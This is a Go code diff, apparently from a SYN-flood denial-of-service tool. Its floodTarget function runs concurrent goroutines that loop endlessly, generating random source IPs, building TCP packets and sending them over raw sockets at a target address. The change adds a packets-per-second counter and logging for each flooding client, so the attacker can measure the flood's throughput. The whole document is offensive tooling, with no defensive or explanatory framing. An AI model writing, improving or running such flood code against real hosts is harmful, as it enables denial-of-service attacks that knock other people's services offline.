@@ -5,6 +5,7 @@ import (
 	"reflect"
 	"sync"
 	"syscall"
+	"time"
 )
 
 func (tcp TCPIP) rawSocket(descriptor int, sockaddr syscall.SockaddrInet4) {
@@ -30,15 +31,25 @@ func (tcp *TCPIP) floodTarget(rType reflect.Type, rVal reflect.Value, clients in
 	for i := 0; i < clients; i++ {
 		wg.Add(1)
 		go func(rType reflect.Type, rVal reflect.Value, fd int,
-			addr syscall.SockaddrInet4, wg *sync.WaitGroup) {
+			addr syscall.SockaddrInet4, wg *sync.WaitGroup,
+			numbClient int) {
+			start := time.Now()
+			synPackets := 0
 			defer wg.Done()
 			for {
 				tcp.genIP()
 				tcp.calcTCPChecksum()
 				tcp.buildPayload(rType, rVal)
 				tcp.rawSocket(fd, addr)
+				synPackets++
+				t := time.Now()
+				if t.Sub(start) > time.Second {
+					log.Println(numbClient, synPackets)
+					synPackets = 0
+					start = time.Now()
+				}
 			}
-		}(rType, rVal, fd, addr, wg)
+		}(rType, rVal, fd, addr, wg, i)
 	}
 }
 
